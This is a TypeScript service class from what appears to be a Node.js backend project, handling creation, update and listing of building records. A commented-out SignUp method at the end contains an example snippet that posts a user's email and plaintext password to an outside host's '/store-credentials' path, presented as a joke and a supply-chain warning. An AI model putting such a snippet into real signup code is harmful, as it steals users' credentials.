import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IBuildingService from './IServices/IBuildingService';
import { BuildingMap } from "../mappers/BuildingMap";
import { IBuildingDTO } from '../dto/IBuildingDTO';

import IBuildingRepo from './IRepos/IBuildingRepo';

import { Building } from '../domain/building';



import { Result } from "../core/logic/Result";

@Service()
export default class BuildingService implements IBuildingService{
  constructor(
      @Inject(config.repos.building.name) private buildingRepo : IBuildingRepo,
      //@Inject(config.repos.Building.name) private BuildingRepo : IBuildingRepo,
      @Inject('logger') private logger,
  ) {}

    public async CreateBuilding(buildingDTO: IBuildingDTO): Promise<Result<{ buildingDTO: IBuildingDTO; }>> {
      try{
        const buildingDocument = await this.buildingRepo.findByCode( buildingDTO.buildingCode );
        const found = !!buildingDocument;
  
        if (found) {
          return Result.fail<{buildingDTO: IBuildingDTO, token: string}>("building already exists with code=" + buildingDTO.buildingCode);
        } 

        const buildingOrError = await Building.create({
            buildingCode: buildingDTO.buildingCode,
            buildingName: buildingDTO.buildingName,
            description: buildingDTO.description,
            height: buildingDTO.height,
            width: buildingDTO.width,
            numOfFloors: buildingDTO.numOfFloors,
            floors: buildingDTO.floors,
            elevatorFloors: buildingDTO.elevatorFloors
          });

          if (buildingOrError.isFailure) {
            throw Result.fail<IBuildingDTO>(buildingOrError.errorValue());
          }

        
        const buildingResult = buildingOrError.getValue();
        await this.buildingRepo.save(buildingResult);
        const buildingDTOResult = BuildingMap.toDTO( buildingResult ) as IBuildingDTO;
        return Result.ok<{buildingDTO: IBuildingDTO}>( {buildingDTO: buildingDTOResult} )
        } catch (e) {
          throw e;
        }
  }

  public async updateBuilding(buildingDTO: IBuildingDTO): Promise<Result<{ buildingDTO: IBuildingDTO; }>>  {
    try {
      const Building = await this.buildingRepo.findByCode(buildingDTO.buildingCode);

      if (Building === null) {
        return Result.fail<{buildingDTO: IBuildingDTO}>("Building not found");
      }
      else {
        Building.name = buildingDTO.buildingName;
        Building.description = buildingDTO.description;
        Building.height = buildingDTO.height;
        Building.width = buildingDTO.width;
        Building.numOfFloors = buildingDTO.numOfFloors;
        Building.floors = buildingDTO.floors;
        Building.elevatorFloors = buildingDTO.elevatorFloors;

        await this.buildingRepo.save(Building);

        const BuildingDTOResult = BuildingMap.toDTO( Building ) as IBuildingDTO;
        return Result.ok<{buildingDTO: IBuildingDTO}>( {buildingDTO: BuildingDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }

  public async getAllBuildings(): Promise<Result<{ buildingDTO: IBuildingDTO[]; }>>  {
    try {
      const Buildings = await this.buildingRepo.getAll();

      if (Buildings === null) {
        return Result.fail<{buildingDTO: IBuildingDTO[]}>("Building not found");
      }
      else {
        const BuildingsDTOResult = Buildings.map( Building => BuildingMap.toDTO( Building ) as IBuildingDTO );
        return Result.ok<{buildingDTO: IBuildingDTO[]}>( {buildingDTO: BuildingsDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }

  public async getBuildingsByMinMax(min: number, max: number): Promise<Result<{ buildingDTO: IBuildingDTO[]; }>>  {
    try {
      const Buildings = await this.buildingRepo.getBuildingsByMinMax(min, max);

      if (Buildings === null) {
        return Result.fail<{buildingDTO: IBuildingDTO[]}>("Building not found");
      }
      else {
        const BuildingsDTOResult = Buildings.map( Building => BuildingMap.toDTO( Building ) as IBuildingDTO );
        return Result.ok<{buildingDTO: IBuildingDTO[]}>( {buildingDTO: BuildingsDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }


  /*public async SignUp(buildingDTO: IbuildingDTO): Promise<Result<{ buildingDTO: IbuildingDTO, token: string }>> {
    try {
      const buildingDocument = await this.buildingRepo.findByEmail( buildingDTO.email );
      const found = !!buildingDocument;
  
      if (found) {
        return Result.fail<{buildingDTO: IbuildingDTO, token: string}>("building already exists with email=" + buildingDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the building password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
             

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(buildingDTO.password, { salt });
      this.logger.silly('Creating building db record');

      const password = await buildingPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await buildingEmail.create( buildingDTO.email ).getValue();
      let Building: Building;

      const BuildingOrError = await this.getBuilding(buildingDTO.Building);
      if (BuildingOrError.isFailure) {
        return Result.fail<{buildingDTO: IbuildingDTO; token: string}>(BuildingOrError.error);
      } else {
        Building = BuildingOrError.getValue();
      }

      const buildingOrError = await building.create({
        firstName: buildingDTO.firstName,
        lastName: buildingDTO.lastName,
        email: email,
        Building: Building,
        password: password,
      });

      if (buildingOrError.isFailure) {
        throw Result.fail<IbuildingDTO>(buildingOrError.errorValue());
      }

      const buildingResult = buildingOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(buildingResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(buildingResult);

      //this.eventDispatcher.dispatch(events.building.signUp, { building: buildingResult });

      await this.buildingRepo.save(buildingResult);
      const buildingDTOResult = buildingMap.toDTO( buildingResult ) as IbuildingDTO;
      return Result.ok<{buildingDTO: IbuildingDTO, token: string}>( {buildingDTO: buildingDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }*/

  


}
